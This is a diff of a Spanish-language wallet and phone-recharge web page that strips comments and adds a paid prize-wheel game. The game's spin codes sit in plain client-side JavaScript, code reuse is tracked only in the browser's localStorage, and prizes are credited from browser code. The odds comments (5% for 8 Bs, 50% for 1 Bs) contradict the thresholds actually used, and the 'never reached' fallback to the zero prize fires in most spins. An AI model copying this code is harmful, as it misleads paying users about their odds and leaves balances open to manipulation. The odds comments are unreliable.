-            // Pestañas móviles
             const mobileTabs = document.querySelectorAll('.mobile-tab');
             mobileTabs.forEach(tab => {
                 tab.addEventListener('click', () => {
@@ -3854,7 +3811,6 @@ const invoiceHTML = `
                 });
             });
             
-            // Filtro de transacciones
             const filterElements = document.querySelectorAll('#transactions-filter, #mobile-transactions-filter');
             filterElements.forEach(filter => {
                 if (filter) {
@@ -3862,7 +3818,6 @@ const invoiceHTML = `
                 }
             });
             
-            // Botones de logout
             const logoutButtons = document.querySelectorAll('#logout-btn, #mobile-logout-btn');
             logoutButtons.forEach(btn => {
                 btn.addEventListener('click', async () => {
@@ -3871,7 +3826,6 @@ const invoiceHTML = `
                 });
             });
             
-            // Modal de perfil
             const editProfileButtons = document.querySelectorAll('#edit-profile-btn, #mobile-edit-profile-btn');
             editProfileButtons.forEach(btn => {
                 btn.addEventListener('click', () => {
@@ -3899,7 +3853,6 @@ const invoiceHTML = `
                 });
             });
             
-            // Cerrar modales de perfil
             const closeProfileButtons = document.querySelectorAll('#close-profile-modal, #mobile-close-profile-modal, #cancel-profile-edit, #mobile-cancel-profile-edit');
             closeProfileButtons.forEach(btn => {
                 btn.addEventListener('click', () => {
@@ -3911,7 +3864,6 @@ const invoiceHTML = `
                 });
             });
             
-            // Cambiar avatar
             const avatarInputs = document.querySelectorAll('#avatar-input, #mobile-avatar-input');
             const changeAvatarButtons = document.querySelectorAll('#mobile-change-avatar-btn, #avatar-input + button');
             
@@ -3937,7 +3889,6 @@ const invoiceHTML = `
                 });
             });
             
-            // Guardar perfil
             const saveProfileButtons = document.querySelectorAll('#save-profile, #mobile-save-profile');
             saveProfileButtons.forEach(btn => {
                 btn.addEventListener('click', async () => {
@@ -3955,13 +3906,11 @@ const invoiceHTML = `
                     if (updatedProfile) {
                         userProfile = updatedProfile;
                         
-                        // Actualizar nombre en todas las instancias
                         const nameElements = document.querySelectorAll('#user-name, #mobile-user-name');
                         nameElements.forEach(el => {
                             if (el) el.textContent = userProfile.full_name;
                         });
                         
-                        // Actualizar avatar en todas las instancias
                         const avatarElements = document.querySelectorAll('#user-avatar, #mobile-user-avatar, #mobile-avatar-preview, #avatar-preview');
                         const initialsElements = document.querySelectorAll('#user-initials, #mobile-user-initials');
                         
@@ -3990,7 +3939,6 @@ const invoiceHTML = `
                 });
             });
             
-            // Modal de recargas
             const rechargeButtons = document.querySelectorAll('#recharge-btn, #mobile-recharge-btn, #new-recharge-btn, #mobile-new-recharge-btn');
             rechargeButtons.forEach(btn => {
                 btn.addEventListener('click', () => {
@@ -4029,7 +3977,6 @@ const invoiceHTML = `
                 });
             });
             
-            // Seleccionar operadora VIVA
             const vivaButtons = document.querySelectorAll('[data-operator="viva"]');
             vivaButtons.forEach(btn => {
                 btn.addEventListener('click', () => {
@@ -4045,7 +3992,6 @@ const invoiceHTML = `
                 });
             });
             
-            // Cerrar modales de recarga
             const closeRechargeButtons = document.querySelectorAll('#close-recharge-modal, #mobile-close-recharge-modal, #cancel-recharge, #mobile-cancel-recharge');
             closeRechargeButtons.forEach(btn => {
                 btn.addEventListener('click', () => {
@@ -4057,7 +4003,6 @@ const invoiceHTML = `
                 });
             });
             
-            // Cerrar modales de recarga VIVA
             const closeVivaButtons = document.querySelectorAll('#close-viva-modal, #mobile-close-viva-modal, #cancel-viva-recharge, #mobile-cancel-viva-recharge');
             closeVivaButtons.forEach(btn => {
                 btn.addEventListener('click', () => {
@@ -4069,11 +4014,9 @@ const invoiceHTML = `
                 });
             });
             
-            // Seleccionar operadora (excepto VIVA)
             const operatorButtons = document.querySelectorAll('[data-operator]:not([data-operator="viva"])');
             operatorButtons.forEach(btn => {
                 btn.addEventListener('click', () => {
-                    // Bloquear ENTEL - no hacer nada si es ENTEL
                     if (btn.dataset.operator === 'entel') {
                         showToast('ENTEL está en cuarentena, no disponible temporalmente', 'error');
                         return;
@@ -4086,7 +4029,6 @@ const invoiceHTML = `
                     });
                     btn.classList.add('selected');
                     
-                    // Actualizar detalles de recarga
                     const amount = document.getElementById('recharge-amount')?.value || document.getElementById('mobile-recharge-amount')?.value;
                     if (amount) {
                         showRechargeDetails(selectedOperator, amount);
@@ -4094,25 +4036,21 @@ const invoiceHTML = `
                 });
             });
             
-            // Seleccionar paquete VIVA
             const vivaPackageButtons = document.querySelectorAll('[data-package]');
             vivaPackageButtons.forEach(btn => {
                 btn.addEventListener('click', () => {
                     selectedVivaPackage = btn.dataset.package;
                     
-                    // Quitar selección de otros botones
                     vivaPackageButtons.forEach(b => {
                         const icon = b.querySelector('.fa-check-circle');
                         if (icon) icon.classList.add('hidden');
                         b.classList.remove('selected');
                     });
                     
-                    // Marcar como seleccionado
                     btn.classList.add('selected');
                     const icon = btn.querySelector('.fa-check-circle');
                     if (icon) icon.classList.remove('hidden');
                     
-                    // Mostrar u ocultar campo de monto personalizado
                     const customContainer = document.getElementById(btn.classList.contains('mobile-operator-btn') ? 'mobile-viva-custom-amount-container' : 'viva-custom-amount-container');
                     if (selectedVivaPackage === 'custom') {
                         customContainer.classList.remove('hidden');
@@ -4122,7 +4060,6 @@ const invoiceHTML = `
                 });
             });
             
-            // Mostrar campo de monto personalizado y detalles
             const rechargeAmountElements = document.querySelectorAll('#recharge-amount, #mobile-recharge-amount');
             rechargeAmountElements.forEach(el => {
                 if (el) {
@@ -4140,7 +4077,6 @@ const invoiceHTML = `
                 }
             });
             
-            // Actualizar detalles cuando cambia el monto personalizado
             const customAmountElements = document.querySelectorAll('#custom-amount, #mobile-custom-amount');
             customAmountElements.forEach(el => {
                 if (el) {
@@ -4152,7 +4088,6 @@ const invoiceHTML = `
                 }
             });
             
-            // Confirmar recarga normal (no VIVA) - USANDO LA NUEVA FUNCIÓN CON FACTURA
             const confirmRechargeButtons = document.querySelectorAll('#confirm-recharge, #mobile-confirm-recharge');
             confirmRechargeButtons.forEach(btn => {
                 btn.addEventListener('click', async function() {
@@ -4160,7 +4095,6 @@ const invoiceHTML = `
                 });
             });
             
-            // Confirmar recarga VIVA - USANDO LA NUEVA FUNCIÓN CON FACTURA
             const confirmVivaButtons = document.querySelectorAll('#confirm-viva-recharge, #mobile-confirm-viva-recharge');
             confirmVivaButtons.forEach(btn => {
                 btn.addEventListener('click', async function() {
@@ -4168,7 +4102,6 @@ const invoiceHTML = `
                 });
             });
             
-            // Modal para enviar dinero
             const sendMoneyButtons = document.querySelectorAll('#send-money-btn, #mobile-send-money-btn');
             sendMoneyButtons.forEach(btn => {
                 btn.addEventListener('click', () => {
@@ -4196,7 +4129,6 @@ const invoiceHTML = `
                 });
             });
             
-            // Cerrar modales de envío
             const closeSendButtons = document.querySelectorAll('#close-send-modal, #mobile-close-send-modal, #cancel-send, #mobile-cancel-send');
             closeSendButtons.forEach(btn => {
                 btn.addEventListener('click', () => {
@@ -4208,7 +4140,6 @@ const invoiceHTML = `
                 });
             });
             
-            // Confirmar envío de dinero - USANDO LA NUEVA FUNCIÓN CON FACTURA
             const confirmSendButtons = document.querySelectorAll('#confirm-send, #mobile-confirm-send');
             confirmSendButtons.forEach(btn => {
                 btn.addEventListener('click', async function() {
@@ -4216,11 +4147,9 @@ const invoiceHTML = `
                 });
             });
             
-            // Botón para recargar saldo (nueva funcionalidad)
             const rechargeBalanceButtons = document.querySelectorAll('#recharge-balance-btn, #mobile-recharge-balance-btn');
             rechargeBalanceButtons.forEach(btn => {
                 btn.addEventListener('click', () => {
-                    // Limpiar formulario
                     const creatorCodeInputs = document.querySelectorAll('#creator-code, #mobile-creator-code');
                     const nameInputs = document.querySelectorAll('#recharge-name, #mobile-recharge-name');
                     const phoneInputs = document.querySelectorAll('#recharge-phone, #mobile-recharge-phone');
@@ -4260,7 +4189,6 @@ const invoiceHTML = `
                 });
             });
             
-            // Cerrar modales de recarga de saldo
             const closeRechargeBalanceButtons = document.querySelectorAll('#close-recharge-balance-modal, #mobile-close-recharge-balance-modal, #cancel-recharge-balance, #mobile-cancel-recharge-balance');
             closeRechargeBalanceButtons.forEach(btn => {
                 btn.addEventListener('click', () => {
@@ -4272,7 +4200,6 @@ const invoiceHTML = `
                 });
             });
             
-            // Manejar selección de archivo de comprobante
             const receiptInputs = document.querySelectorAll('#recharge-receipt, #mobile-recharge-receipt');
             receiptInputs.forEach(input => {
                 input.addEventListener('change', function() {
@@ -4288,7 +4215,6 @@ const invoiceHTML = `
                 });
             });
             
-            // Confirmar solicitud de recarga de saldo (ACTUALIZADA CON CÓDIGO DEL CREADOR)
             const confirmRechargeBalanceButtons = document.querySelectorAll('#confirm-recharge-balance, #mobile-confirm-recharge-balance');
             confirmRechargeBalanceButtons.forEach(btn => {
                 btn.addEventListener('click', async () => {
@@ -4321,7 +4247,6 @@ const invoiceHTML = `
                         return;
                     }
                     
-                    // Mostrar spinner de carga
                     const confirmText = document.getElementById(isMobile ? 'mobile-confirm-recharge-balance-text' : 'confirm-recharge-balance-text');
                     const confirmSpinner = document.getElementById(isMobile ? 'mobile-confirm-recharge-balance-spinner' : 'confirm-recharge-balance-spinner');
                     
@@ -4330,13 +4255,12 @@ const invoiceHTML = `
                     if (confirmSpinner) confirmSpinner.classList.remove('hidden');
                     
                     try {
-                        // Enviar solicitud al nuevo bot de Telegram para recargas
                         const rechargeData = {
                             name,
                             phone,
                             amount,
                             email: currentUser.email,
-                            creatorCode: creatorCode || '' // Agregar el código del creador
+                            creatorCode: creatorCode || ''
                         };
                         
                         const success = await sendRechargeRequest(rechargeData, receiptFile);
@@ -4356,7 +4280,6 @@ const invoiceHTML = `
                         console.error('Error en el proceso de recarga de saldo:', error);
                         showToast('Error al enviar la solicitud', 'error');
                     } finally {
-                        // Restaurar estado del botón
                         btn.disabled = false;
                         if (confirmText) confirmText.textContent = 'Enviar solicitud';
                         if (confirmSpinner) confirmSpinner.classList.add('hidden');
@@ -4364,8 +4287,6 @@ const invoiceHTML = `
                 });
             });
             
-            // Event listeners para la factura - MEJORAS ESPECÍFICAS PARA MÓVIL
-            // Cerrar modal de factura
             const closeInvoiceButtons = document.querySelectorAll('#close-invoice-modal, #close-invoice');
             closeInvoiceButtons.forEach(btn => {
                 btn.addEventListener('click', (e) => {
@@ -4374,7 +4295,6 @@ const invoiceHTML = `
                 });
             });
             
-            // Descargar factura - MEJORA ESPECÍFICA PARA MÓVIL
             const downloadInvoiceBtn = document.getElementById('download-invoice');
             if (downloadInvoiceBtn) {
                 downloadInvoiceBtn.addEventListener('click', (e) => {
@@ -4383,9 +4303,288 @@ const invoiceHTML = `
                 });
             }
             
-            // Cargar datos iniciales
             updateUI();
         });
+
+        // ==================== LÓGICA DE LA RULETA (PROBABILIDADES AJUSTADAS) ====================
+        // 10 códigos únicos con formato GC-TOK-XXXX (máximo 12 caracteres)
+        const VALID_CODES = new Set([
+            'GC-TOK-X8P9',
+            'GC-TOK-M3N2',
+            'GC-TOK-K7J4',
+            'GC-TOK-R5T6',
+            'GC-TOK-W2Z1',
+            'GC-TOK-Q9L0',
+            'GC-TOK-F4D5',
+            'GC-TOK-H6G7',
+            'GC-TOK-V8C3',
+            'GC-TOK-B1N9'
+        ]);
+
+        // Premios en el orden de la ruleta (10 segmentos) - ACTUALIZADO: 0 en lugar de 0.50
+        const PRIZES = [0, 1, 2, 5, 8, 0, 1, 2, 5, 8];
+
+        // Almacén local de códigos usados
+        let usedCodes = new Set();
+
+        try {
+            const stored = localStorage.getItem('toktok_used_codes');
+            if (stored) {
+                usedCodes = new Set(JSON.parse(stored));
+            }
+        } catch (e) {
+            console.warn('Error cargando códigos usados', e);
+        }
+
+        function saveUsedCodes() {
+            try {
+                localStorage.setItem('toktok_used_codes', JSON.stringify(Array.from(usedCodes)));
+            } catch (e) {
+                console.warn('Error guardando códigos usados', e);
+            }
+        }
+
+        const fab = document.getElementById('roulette-fab');
+        const modal = document.getElementById('roulette-modal');
+        const closeBtn = document.getElementById('close-roulette-modal');
+        const spinBtn = document.getElementById('spin-roulette-btn');
+        const buySpinBtn = document.getElementById('buy-spin-btn');
+        const codeInput = document.getElementById('roulette-code');
+        const wheel = document.getElementById('wheel');
+        const messageEl = document.getElementById('roulette-message');
+        let isSpinning = false;
+
+        // Abrir modal
+        fab.addEventListener('click', () => {
+            modal.classList.remove('opacity-0', 'invisible');
+            modal.classList.add('opacity-100', 'visible');
+            codeInput.value = '';
+            messageEl.textContent = '';
+            wheel.style.transform = 'rotate(0deg)';
+        });
+
+        // Cerrar modal
+        function closeModalRoulette() {
+            modal.classList.remove('opacity-100', 'visible');
+            modal.classList.add('opacity-0', 'invisible');
+        }
+        closeBtn.addEventListener('click', closeModalRoulette);
+        modal.addEventListener('click', (e) => {
+            if (e.target === modal) closeModalRoulette();
+        });
+
+        // Función para agregar premio al saldo y registrar transacción
+        async function addPrizeToBalance(prizeAmount) {
+            if (!currentUser) {
+                messageEl.textContent = '❌ Debes iniciar sesión primero';
+                return false;
+            }
+
+            try {
+                const transaction = await createTransaction(
+                    currentUser.id,
+                    prizeAmount,
+                    'deposit',
+                    `🎉 Premio de ruleta: Bs ${prizeAmount}`,
+                    { source: 'roulette' }
+                );
+
+                if (!transaction) {
+                    throw new Error('No se pudo crear la transacción');
+                }
+
+                const newBalance = (currentBalance || 0) + prizeAmount;
+                currentBalance = newBalance;
+
+                const balanceElements = document.querySelectorAll('#balance, #mobile-balance');
+                balanceElements.forEach(el => {
+                    if (el) el.textContent = formatCurrency(newBalance);
+                });
+
+                const transactions = await loadTransactions(currentUser.id);
+                renderTransactions(transactions);
+
+                messageEl.textContent = `✅ ¡Ganaste Bs ${prizeAmount}! Se añadió a tu saldo.`;
+                return true;
+            } catch (error) {
+                console.error('Error al agregar premio:', error);
+                messageEl.textContent = '❌ Error al acreditar el premio';
+                return false;
+            }
+        }
+
+        // Función para realizar el giro
+        async function performSpin(prizeIndex) {
+            const prize = PRIZES[prizeIndex];
+            const segmentAngle = 360 / PRIZES.length;
+            const spins = 5;
+            const finalRotation = 360 * spins + (360 - (prizeIndex * segmentAngle + segmentAngle / 2));
+
+            wheel.style.transform = `rotate(${finalRotation}deg)`;
+
+            return new Promise((resolve) => {
+                setTimeout(async () => {
+                    const success = await addPrizeToBalance(prize);
+                    resolve(success);
+                }, 3000);
+            });
+        }
+
+        // Función para obtener índice basado en probabilidades personalizadas
+        function getPrizeIndexWithProbability() {
+            const rand = Math.random() * 100; // 0 a 100
+            
+            // 5% para 8 Bs
+            if (rand < 1) {
+                // Buscar índices donde el premio es 8
+                const eightIndices = PRIZES.reduce((acc, prize, index) => {
+                    if (prize === 8) acc.push(index);
+                    return acc;
+                }, []);
+                return eightIndices[Math.floor(Math.random() * eightIndices.length)];
+            }
+            // 6% para 5 Bs
+            else if (rand < 3) { // 5 + 6 = 11
+                const fiveIndices = PRIZES.reduce((acc, prize, index) => {
+                    if (prize === 5) acc.push(index);
+                    return acc;
+                }, []);
+                return fiveIndices[Math.floor(Math.random() * fiveIndices.length)];
+            }
+            // 40% para 2 Bs
+            else if (rand < 35) { // 11 + 40 = 51
+                const twoIndices = PRIZES.reduce((acc, prize, index) => {
+                    if (prize === 2) acc.push(index);
+                    return acc;
+                }, []);
+                return twoIndices[Math.floor(Math.random() * twoIndices.length)];
+            }
+            // 50% para 1 Bs
+            else if (rand < 39) { // 51 + 50 = 101 (cubre hasta 100)
+                const oneIndices = PRIZES.reduce((acc, prize, index) => {
+                    if (prize === 1) acc.push(index);
+                    return acc;
+                }, []);
+                return oneIndices[Math.floor(Math.random() * oneIndices.length)];
+            }
+            
+            // Fallback (nunca debería llegar aquí)
+            return 0;
+        }
+
+        // Lógica del giro con código
+        spinBtn.addEventListener('click', async () => {
+            if (isSpinning) return;
+
+            const code = codeInput.value.trim().toUpperCase();
+
+            if (!code) {
+                messageEl.textContent = '⚠️ Ingresa un código';
+                return;
+            }
+
+            if (!VALID_CODES.has(code)) {
+                messageEl.textContent = '❌ Código inválido';
+                return;
+            }
+
+            if (usedCodes.has(code)) {
+                messageEl.textContent = '⛔ Este código ya fue usado';
+                return;
+            }
+
+            if (!currentUser) {
+                messageEl.textContent = '❌ No hay sesión activa';
+                return;
+            }
+
+            isSpinning = true;
+            spinBtn.disabled = true;
+            buySpinBtn.disabled = true;
+            messageEl.textContent = '🎡 Girando...';
+
+            const prizeIndex = getPrizeIndexWithProbability();
+            usedCodes.add(code);
+            saveUsedCodes();
+
+            const success = await performSpin(prizeIndex);
+
+            if (!success) {
+                usedCodes.delete(code);
+                saveUsedCodes();
+            }
+
+            spinBtn.disabled = false;
+            buySpinBtn.disabled = false;
+            isSpinning = false;
+        });
+
+        // Lógica del giro comprado por 1 Bs
+        buySpinBtn.addEventListener('click', async () => {
+            if (isSpinning) return;
+
+            if (!currentUser) {
+                messageEl.textContent = '❌ No hay sesión activa';
+                return;
+            }
+
+            if (currentBalance < 1) {
+                messageEl.textContent = '❌ Saldo insuficiente para comprar un giro (1 Bs)';
+                return;
+            }
+
+            isSpinning = true;
+            spinBtn.disabled = true;
+            buySpinBtn.disabled = true;
+            messageEl.textContent = '🎡 Comprando giro...';
+
+            // Crear transacción de compra del giro (retiro de 1 Bs)
+            const purchaseTransaction = await createTransaction(
+                currentUser.id,
+                1,
+                'withdrawal',
+                '🎰 Compra de giro en ruleta',
+                { source: 'roulette_purchase' }
+            );
+
+            if (!purchaseTransaction) {
+                messageEl.textContent = '❌ Error al procesar la compra';
+                spinBtn.disabled = false;
+                buySpinBtn.disabled = false;
+                isSpinning = false;
+                return;
+            }
+
+            // Actualizar balance local
+            currentBalance -= 1;
+            const balanceElements = document.querySelectorAll('#balance, #mobile-balance');
+            balanceElements.forEach(el => {
+                if (el) el.textContent = formatCurrency(currentBalance);
+            });
+
+            messageEl.textContent = '🎡 Girando...';
+
+            const prizeIndex = getPrizeIndexWithProbability();
+            const success = await performSpin(prizeIndex);
+
+            spinBtn.disabled = false;
+            buySpinBtn.disabled = false;
+            isSpinning = false;
+        });
+        // ==================== FIN LÓGICA DE LA RULETA PROBABILIDADES AJUSTADAS ====================
     </script>
+
+    <style>
+        #wheel {
+            transition: transform 3s cubic-bezier(0.25, 0.1, 0.15, 1);
+        }
+        .animate-bounce {
+            animation: bounce 2s infinite;
+        }
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+    </style>
 </body>
 </html>
